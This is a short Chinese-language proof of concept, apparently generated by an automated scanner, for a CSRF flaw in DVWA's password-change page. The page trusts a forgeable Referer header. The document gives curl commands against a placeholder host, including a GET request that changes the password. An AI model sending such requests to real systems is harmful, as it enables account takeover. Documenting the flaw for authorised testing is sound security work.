# POC — DVWA 密码修改接口仅依赖可伪造的 HTTP_REFERER 做来源校验，导致 CSRF 强制改密/账户接管

- finding_id: `LLM-a82244673cd8`
- type: `business_logic` / CWE-840
- severity: `high`
- file: `024.php:19`

## 步骤

1. **确认目标可达且已获授权**  
```http
curl -sS -i 'http://TARGET:8080/024.php'
```
预期：返回应用页面/接口响应，而不是连接失败

2. **发送 业务逻辑漏洞 载荷**  
```http
curl -sS -i -X GET 'http://TARGET:8080/024.php?password_new=SUNSET_PROBE'
```
预期：按漏洞类型观察相应的异常响应/副作用。

3. **记录响应与副作用：对比基线响应，检查 TARGET 侧文件或带外通道**  
预期：出现与基线不同的内容、状态码、延迟或副作用

## 安全说明

POC 仅为文本工件；落日二号不会执行它，也不会联网或搭建沙箱。仅限授权测试。